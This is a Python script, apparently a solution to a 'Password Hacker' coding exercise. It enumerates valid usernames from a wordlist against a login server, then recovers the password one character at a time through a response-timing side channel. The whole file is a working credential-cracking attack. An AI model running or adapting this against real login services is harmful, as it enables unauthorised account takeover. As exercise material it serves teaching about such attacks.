from socket import socket
import sys
import json
import string
import time

LOGIN_PATH = "D:\\Python\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt"
args = sys.argv
alphanumeric_list = list(string.ascii_lowercase + string.digits + string.ascii_uppercase)
address = (args[1], int(args[2]))
sock = socket()
sock.connect(address)
input_json = {"login": "admin", "password": " "}


def password_brute(input_json):
    global alphanumeric_list
    timelist = []
    for i in alphanumeric_list:
        login_json = json.dumps(input_json).encode()
        start = time.perf_counter()
        sock.send(login_json)
        output = json.loads(sock.recv(1024).decode())
        end = time.perf_counter()
        timelist.append(end - start)
        if output["result"] == "Connection success!":
            login_json = login_json.decode()
            print(login_json)
            exit()
        elif (end - start) * 10 ** 6 >= 90000:
            input_json["password"] = input_json["password"] + i
            password_brute(input_json)
        else:
            input_json["password"] = input_json["password"][:-1] + i


with open(LOGIN_PATH) as login_dict:
    logins = login_dict.readlines()
    logins = [i.rstrip("\n") for i in logins]
    for login in logins:
        input_json["login"] = login
        login_json = json.dumps(input_json).encode()
        sock.send(login_json)
        output = json.loads(sock.recv(1024).decode())
        if output["result"] == "Wrong password!":
            login_json = login_json.decode()
            input_json["password"] = ""
            password_brute(input_json)

sock.close()
